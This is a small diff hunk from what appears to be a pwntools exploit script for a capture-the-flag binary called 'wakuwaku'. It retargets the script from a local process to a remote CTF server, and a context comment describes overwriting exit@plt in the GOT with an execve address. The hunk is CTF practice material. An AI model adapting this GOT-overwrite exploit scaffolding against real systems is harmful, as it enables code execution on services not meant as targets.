@@ -12,7 +12,7 @@ plt_execve_addr = b"4199280"  # Cover exit@plt() into 0x401370 in GOT, note that
 
 
 # Start process
-p = process("./wakuwaku")
+p = remote("ctf.adl.tw", 10010)
 
 
 # Stop there and attached with gdb
